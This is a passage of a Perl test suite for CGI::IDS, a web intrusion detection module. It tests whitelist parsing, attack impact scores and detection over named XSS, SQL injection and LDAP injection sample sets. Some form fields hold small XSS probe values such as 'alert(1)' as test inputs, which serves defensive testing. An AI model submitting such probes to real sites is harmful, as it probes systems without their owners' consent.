like( $@, qr/(?:Error in _load_whitelist_from_xml while parsing)(?!.*(?:File does not exist))/, 'Croak if whitelist file has incorrect XML');

eval {
    my $ids = new CGI::IDS(
        whitelist_file  => "$Bin/data/test_param_whitelist_bad_regex.xml",
    );
};
like( $@, qr/Error in whitelist rule/, 'Croak if whitelist file contains incorrect RegEx' );

# instantiate IDS for detection tests
print testmessage("instantiate IDS for detection tests");
my $ids = new CGI::IDS(
    whitelist_file  => "$Bin/data/test_param_whitelist.xml",
);
isa_ok ($ids, 'CGI::IDS');

# test get_attacks()
print testmessage("test get_attacks()");
ok (!$ids->get_attacks(), 'No attack found if no detection run');
$ids->detect_attacks(request => \%testSimpleScan);
isa_ok ($ids->get_attacks(),                                                'ARRAY',    'The return value of get_attacks()');

my $attacks = $ids->get_attacks();
ok ($attacks, 'Attacks returned in get_attacks()');
is ($attacks->[0]->{impact},                                                8,          'Correct impact returned by get_attacks()');

# test key scanning
print testmessage("test key scanning");
is ($ids->detect_attacks(request => \%testScanKeys),                        16,         "testScanKeys default (off)");

$ids->set_scan_keys(scan_keys => 1);
is ($ids->detect_attacks(request => \%testScanKeys),                        32,         "testScanKeys set on");

$ids->set_scan_keys(scan_keys => 0);
is ($ids->detect_attacks(request => \%testScanKeys),                        16,         "testScanKeys set off");

$ids->set_scan_keys(scan_keys => 1);
$ids->set_scan_keys();
is ($ids->detect_attacks(request => \%testScanKeys),                        16,         "testScanKeys set from 1 to default (off)");

# test whitelist
print testmessage("test whitelist");
is ($ids->detect_attacks(request => \%testWhitelistScan),                   8,          "testWhitelistScan");
is ($ids->detect_attacks(request => \%testWhitelistScan2),                  8,          "testWhitelistScan2");
is ($ids->detect_attacks(request => \%testWhitelistScan3),                  8,          "testWhitelistScan3");
is ($ids->detect_attacks(request => \%testWhitelistScan4),                  16,         "testWhitelistScan4");
is ($ids->detect_attacks(request => \%testWhitelistScan5),                  8,          "testWhitelistScan5");
is ($ids->detect_attacks(request => \%testWhitelistSkip),                   0,          "testWhitelistSkip");
is ($ids->detect_attacks(request => \%testWhitelistSkip2),                  8,          "testWhitelistSkip2");
is ($ids->detect_attacks(request => \%testWhitelistSkip3),                  8,          "testWhitelistSkip3");

# test UTF-8 handling
is ($ids->detect_attacks(request => \%testMalformedUTF8),                   70,          "testMalformedUTF8");

# test converters and filters
print testmessage("test converters and filters");
is ($ids->detect_attacks(request => \%testAttributeBreakerList),            29,         "testAttributeBreakerList");
is ($ids->detect_attacks(request => \%testCommentList),                     9,          "testCommentList");
is ($ids->detect_attacks(request => \%testConcatenatedXSSList),             1126,       "testConcatenatedXSSList");
is ($ids->detect_attacks(request => \%testConcatenatedXSSList2),            1047,       "testConcatenatedXSSList2");
is ($ids->detect_attacks(request => \%testXMLPredicateXSSList),             148,        "testXMLPredicateXSSList");
is ($ids->detect_attacks(request => \%testConditionalCompilationXSSList),   87,         "testXMLPredicateXSSList");
is ($ids->detect_attacks(request => \%testXSSList),                         771,        "testXSSList");
is ($ids->detect_attacks(request => \%testSelfContainedXSSList),            530,        "testSelfContainedXSSList");
is ($ids->detect_attacks(request => \%testSQLIList),                        464,        "testSQLIList");
is ($ids->detect_attacks(request => \%testSQLIList2),                       634,        "testSQLIList2");
is ($ids->detect_attacks(request => \%testSQLIList3),                       591,        "testSQLIList3");
is ($ids->detect_attacks(request => \%testSQLIList4),                       853,        "testSQLIList4");
is ($ids->detect_attacks(request => \%testSQLIList5),                       928,        "testSQLIList5");
is ($ids->detect_attacks(request => \%testSQLIList6),                       546,        "testSQLIList6");
is ($ids->detect_attacks(request => \%testDTList),                          126,        "testDTList");
is ($ids->detect_attacks(request => \%testURIList),                         143,        "testURIList");
is ($ids->detect_attacks(request => \%testRFEList),                         524,        "testRFEList");
is ($ids->detect_attacks(request => \%testUTF7List),                        71,         "testUTF7List");
is ($ids->detect_attacks(request => \%testBase64CCConverter),               151,        "testBase64CCConverter");
is ($ids->detect_attacks(request => \%testDecimalCCConverter),              72,         "testDecimalCCConverter");
is ($ids->detect_attacks(request => \%testOctalCCConverter),                48,         "testOctalCCConverter");
is ($ids->detect_attacks(request => \%testHexCCConverter),                  109,        "testHexCCConverter");
is ($ids->detect_attacks(request => \%testLDAPInjectionList),               20,         "testLDAPInjectionList");
is ($ids->detect_attacks(request => \%testJSONScanning),                    32,         "testJSONScanning");
is ($ids->detect_attacks(request => \%testForFalseAlerts),                  0,          "testForFalseAlerts");

#------------------------- CGI::IDS::Whitelist Tests -----------------------------------------------
print testmessage("Whitelist Processor tests");

eval {
    my $whitelist_fail = new CGI::IDS::Whitelist(
        whitelist_file  => "$Bin/data/missing_param_whitelist.xml",
    );
};
like( $@, qr/_load_whitelist_from_xml.*File does not exist/, 'Croak if whitelist file is missing' );

my $whitelist = new CGI::IDS::Whitelist (
    whitelist_file  => "$Bin/data/test_param_whitelist.xml",
);
isa_ok ($whitelist, 'CGI::IDS::Whitelist');


my %testWhitelist = (
    login_password  =>  'alert(1)',
    name            =>  'hinnerk',
    lastname        =>  'hinnerk alert(2)',
    action          =>  'login',
    username        =>  'hinnerk',
    scr_rec_id      =>  '8763476.946ef987',
    send            =>  '',
    uid             =>  'alert(1)',
    cert            =>  'alert(1)',
);
ok (!$whitelist->is_suspicious(key => 'login_password', request => \%testWhitelist),    "login_password whitelisted as per rule and conditions");
ok ( $whitelist->is_suspicious(key => 'lastname', request => \%testWhitelist),          "login_password is suspicious");
ok (!$whitelist->is_suspicious(key => 'name', request => \%testWhitelist),              "name is not suspicious");
ok (!$whitelist->is_suspicious(key => 'uid', request => \%testWhitelist),               "uid is generally whitelisted");
ok (!$whitelist->is_suspicious(key => 'scr_rec_id', request => \%testWhitelist),        "scr_rec_id is whitelisted as per rule");
ok ( $whitelist->is_suspicious(key => 'cert', request => \%testWhitelist),              "cert is not whitelisted due to failing conditions");

ok ( $whitelist->is_harmless_string("hinnerk"),                                         "'hinnerk' is a harmless string");
ok (!$whitelist->is_harmless_string("hinnerk(1)"),                                      "'hinnerk(1)' is not a harmless string");

ok ( (grep {$_->{key} eq 'lastname'} @{$whitelist->suspicious_keys()}),                 "'lastname' is in suspicious_keys list");
ok (!(grep {$_->{key} eq 'name'}     @{$whitelist->suspicious_keys()}),                 "'name' is not in suspicious_keys list");
ok (!(grep {$_->{key} eq 'lastname'} @{$whitelist->non_suspicious_keys()}),             "'lastname' is not in non_suspicious_keys list");
ok ( (grep {$_->{key} eq 'name'}     @{$whitelist->non_suspicious_keys()}),             "'name' is in non_suspicious_keys list");

$whitelist->reset();
ok (!(grep {$_->{key} eq 'lastname'} @{$whitelist->suspicious_keys()}),                 "'lastname' is not in suspicious_keys list after reset");
ok (!(grep {$_->{key} eq 'name'}     @{$whitelist->suspicious_keys()}),                 "'name' is not in suspicious_keys list after reset");
ok (!(grep {$_->{key} eq 'lastname'} @{$whitelist->non_suspicious_keys()}),             "'lastname' is not in non_suspicious_keys list after reset");
ok (!(grep {$_->{key} eq 'name'}     @{$whitelist->non_suspicious_keys()}),             "'name' is not in non_suspicious_keys list after reset");

like ($whitelist->convert_if_marked_encoded( key => 'json_value', value => '{"a":"b","c":["123", 111, "456"]}' ), qr/^[a-c1-6\n]+$/, 'param marked as JSON has been converted');

sub testmessage {
    (my $message) = @_;
    return "\n-- $message\n";
}
